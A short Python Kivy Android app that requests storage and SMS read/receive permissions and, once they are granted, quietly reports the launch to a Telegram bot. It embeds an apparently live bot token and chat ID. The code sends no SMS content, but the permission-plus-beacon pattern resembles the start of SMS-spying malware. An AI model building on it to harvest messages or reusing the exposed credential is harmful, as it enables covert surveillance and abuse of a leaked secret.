from kivy.app import App
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission
import requests

BOT_TOKEN = "7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk"
CHAT_ID = "5739065274"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=10)
    except Exception as e:
        print(f"خطأ في إرسال الرسالة: {e}")

class MyApp(App):

    def on_permissions_callback(self, permissions, grants):
        if all(grants):
            send_telegram_message("🚀 تم تشغيل التطبيق بنجاح!")
        else:
            print("لم يتم منح جميع الأذونات.")

    def build(self):
        # طلب الأذونات وقت تشغيل التطبيق
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_SMS,
            Permission.RECEIVE_SMS,
        ], self.on_permissions_callback)

        return Label(text="تطبيق Kivy يطلب الأذونات ويرسل رسالة")

if __name__ == '__main__':
    MyApp().run()